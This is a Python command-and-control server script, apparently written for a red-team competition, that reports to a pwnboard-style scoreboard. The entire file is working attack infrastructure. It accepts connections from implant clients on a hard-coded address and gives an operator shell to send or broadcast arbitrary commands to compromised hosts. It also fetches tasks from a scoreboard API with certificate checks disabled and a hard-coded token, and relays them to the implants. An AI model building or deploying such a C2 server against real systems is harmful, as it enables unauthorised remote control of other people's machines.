# Matt Sisco - C2 Server Script
import socket
import time
import threading
import sys

# store client connections and their IDs
clients = {}
client_id = 0 
lock = threading.Lock()

#####################
# Whackamole Funcs
#####################

import json, urllib, ssl
import urllib.request, urllib.error

SERVER_URL="https://127.0.0.1:8000/"
AGENT_TYPE="matt_c2"
AUTH_TOKEN="abc_123"
AUTH_TOKEN_DEFAULT="abc_123"
AUTH_TOKEN_LOCK = threading.Lock()

# Allow connection to the server (uses a self signed cert)
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

def print_debug(message):
    # Stub function for a more detailed logging functionally present in Andrew's main codebase that doesn't make sense to replicate here
    # For example, if you have a DEBUG flag set, then print to console/logfile.
    # Otherwise (full deploy for comp), suppress output.
    #print(message)
    pass

def send_message(cid,agent_ip,endpoint,message="",oldStatus=True,newStatus=True,server_timeout=5):
    """
    Sends the specified data to the server.
    Handles the full process and attaching agent name/auth/system details.

    Args: endpoint(string,required),message(any),oldStatus/newStatus(bool)
    Returns: status(Bool)
    """
    global AUTH_TOKEN
    if not SERVER_URL:
        # Server comms are intentionally disabled (server_url is an empty string)
        # Maybe redirect to print_debug instead?
        return False, "no SERVER_URL value specified"

    try:
        url = SERVER_URL + endpoint

        # Prep payload
        # Note that not all of these are strictly needed for every endpoint. However, the server accepts extra data fields without complaint, 
        # they do not add appreciable data leakage or transmission size to the communication, and they greatly simplify the arguments and 
        # assembly logic of the payload, so we attach the same data to every communication.
        payload = {
            "name": f"agent_{cid}",
            "hostname": "N/A", #systemInfo["hostname"],
            "ip": agent_ip, #systemInfo["ipadd"],
            "os": "N/A", #
            "executionUser": "N/A", #systemInfo["executionUser"],
            "executionAdmin": True, #systemInfo["executionAdmin"],
            "auth": AUTH_TOKEN,
            "agent_type": AGENT_TYPE,
            "oldStatus": oldStatus,
            "newStatus": newStatus,
            "message": message
        }

        # Prepare data as JSON for transmit
        data = json.dumps(payload).encode("utf-8")

        # Build request
        req = urllib.request.Request(
            url,
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST" # literally every endpoint is standardized on POST for agent comms as it's needed to send AUTH and other items
        )

        # Send payload
        with urllib.request.urlopen(req, timeout=server_timeout, context=CTX) as response:
            if response.getcode() == 200:
                # Good result! Now parse and return the endpoint
                print_debug(f"send_message({url}): sent msg to server: [{oldStatus,newStatus,message}]")
                response_text = response.read().decode('utf-8')
                # All beacon endpoints provide a new AUTH value that should be read in memory to replace the configured one
                # This updated AUTH value is needed for every agent endpoint beyond the basic beacon
                if "agent/beacon" in endpoint:
                    if AUTH_TOKEN == AUTH_TOKEN_DEFAULT:
                        if response_text != AUTH_TOKEN:
                            with AUTH_TOKEN_LOCK:
                                AUTH_TOKEN = response_text
                            print_debug(f"send_message({url}): updating auth token value to new value from server {AUTH_TOKEN}")
                return True, response_text
            else:
                print_debug(f"send_message({url}): Server error: {response.getcode()}")

    # Error handling
    # Various requests errors - networking failure or 4xx/5xx code from server (out of scope for client-side error handling)
    except urllib.error.HTTPError as e:
        print_debug(f"[send_message({url}): HTTP error: {e.code} {e.reason}")
    except urllib.error.URLError as e:
        print_debug(f"send_message({url}): URL error: {e.reason}")
    except Exception as e:
        print_debug(f"send_message({url}): Beacon error: {e}")
    return False, ""

def pwnboard_agent(cid, agent_ip):
    # Handles keepalives and tasking for a single agent for a single iteration. Should be ran threaded.
    # Only checks for a single command each iteration.
    status, response = send_message(cid,agent_ip,"agent/beacon","keepalive")
    status, response = send_message(cid,agent_ip,"agent/get_task")
    if status: # Check that communication was successful
        if response != "no pending tasks":
            # We have a task waiting! Let's decode it (see API spec document):
            data = json.loads(response)
            task_id = data.get('task_id')
            task_command = data.get('task')
            try:
                result = send_command_to_client(cid, task_command)
            except Exception as E:
                # Always account for weird errors (or a simple timeout) when you least expect it!
                # Don't leave the server hanging:
                print_debug(f"subprocess exception: {E}")
                result = f"unexpected exception when trying to execute task: {str(E)[:100]}" # truncate in case it's really big
            finally:
                # Now, we'll send the result back to the server
                resultjson = json.dumps({"task_id": task_id, "result": result}, separators=(',', ':')) # specify separators to compact whitespace
                status, response = send_message(cid,agent_ip,"agent/set_task_result",message=resultjson)

def pwnboard_loop():
    # Spawns keepalive/task threads
    while True:
        active_agents = []
        with lock:
            # 3. Iterate through the dictionary
            for cid, client_socket in clients.items():
                try:
                    # 4. Query the socket for its current remote address
                    remote_ip = client_socket.getpeername()[0]
                    
                    # 5. Append the pair to our local list
                    active_agents.append((cid, remote_ip))
                except socket.error:
                    # Handle cases where the socket exists in the dict but just died
                    continue
        
        threads = []
        for cid, ip in active_agents:
            # Create a dedicated thread for this specific agent's turn and run them simultaneously
            t = threading.Thread(target=pwnboard_agent, args=(cid, ip,), daemon=True)
            t.start()
            threads.append(t)

        # wait for all agent threads to finish to avoid threat overload if one is hanging too much
        # for t in threads:
        #     t.join(timeout=10) # Wait up to 10 seconds per thread

        time.sleep(60) # wait for next iteration

#####################
# End Whackamole Funcs
##################### 

def handle_client(client_socket, client_addr, cid):
    print(f"Client {cid} connected from {client_addr}")
    status, response = send_message(cid,client_addr,"agent/beacon")
    clients[cid] = client_socket

    try:
        while True:
            # receive response/output from client
            response = client_socket.recv(1024).decode()
            if not response:
                break
            
            print(f"\n[Client {cid}] Output:\n{response}")
    except Exception as e:
        print(f"Error with client {cid}: {e}")
    finally:
        print(f"Client {cid} disconnected")
        with lock:
            try:
                # may already have been deleted elsewhere, so silent fail
                del clients[cid]
            except:
                pass
        client_socket.close()

def broadcast_command(cmd):
    # Add functionality to send a command to all connected clients
    with lock:
        for cid, client_socket in clients.items():
            try:
                print(f"Sending command to client {cid}: {cmd}")
                client_socket.sendall(cmd.encode('utf-8'))
            except Exception as e:
                print(f"Error sending to client {cid}: {e}")

def send_command_to_client(cid, cmd):
    # Add functionality to send a command to a specific client by ID
    with lock:
        client_socket = clients.get(cid)
        if client_socket:
            try:
                client_socket.sendall(cmd.encode('utf-8'))
                msg = f"Sent command to client {cid}: {cmd}"
                print(msg)
                return msg
            except Exception as e:
                msg = f"Error sending to client {cid}: {e}"
                print(msg)
                return msg
        else:
            msg = f"No client with ID {cid}"
            print(msg)
            return msg

def list_sessions():
    # Add functionality to list all active client sessions with their IDs
    with lock:
        if clients:
            print("Active sessions:")
            for cid in clients.keys():
                print(f"Client ID: {cid}")
        else:
            print("No active sessions.")

def server_shell():
    # Add an interactive shell for the operator to manage sessions and send commands
    global client_id
    while True:
        cmd = input("C2> ").strip()
        if cmd == "list":
            list_sessions()
        elif cmd.startswith("send "):
            try:
                cid = int(cmd.split()[1])
                if cid in clients:
                    print(f"\nEnter command to send to client {cid}:")
                    while True:
                        sub_cmd = input(f"Client {cid}> ").strip()
                        if sub_cmd == "background":
                            break
                        elif sub_cmd:
                            send_command_to_client(cid, sub_cmd)
                else:
                    print(f"No client with ID {cid}")
            except (ValueError, IndexError):
                print("Invalid command format. Use 'send <client_id> <command>'")

        elif cmd.startswith("broadcast "):
            # Extract the command to broadcast
            command = cmd[10:].strip()
            if command:
                broadcast_command(command)
            else:
                print("Usage: broadcast <command>")
        elif cmd in ["exit", "quit"]:
            with lock:
                for client_socket in clients.values():
                    try:
                        client_socket.close()
                    except:
                        # misc cases where it can fail (was already closed...)
                        pass
            sys.exit(0)
            print("Shutting down server...")
            break
        else:
            print("Unknown command. Use 'list', 'send <client_id> <command>', 'broadcast <command>', or 'exit'.")

def main():
    global client_id
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("192.168.10.13", 9999))
    server.listen(5)
    print("Server listening on 192.168.10.13:9999")
    
    # Start accept thread
    def accept_connections():
        global client_id
        try:
            while True:
                # Accept new client connections
                client_socket, client_addr = server.accept()
                with lock:
                    client_id += 1
                    client_thread = threading.Thread(target=handle_client, args=(client_socket, client_addr, client_id))
                    client_thread.daemon = True
                    client_thread.start()
        except KeyboardInterrupt:
            pass
    
    accept_thread = threading.Thread(target=accept_connections, daemon=True)
    accept_thread.start()

    pwnboard_loop_thread = threading.Thread(target=pwnboard_loop, args=(), daemon=True)
    pwnboard_loop_thread.start()
    
    # Run the interactive shell in main thread
    try:
        server_shell()
    except KeyboardInterrupt:
        print("Shutting down server...")
    finally:
        server.close()

if __name__ == "__main__":    
    main()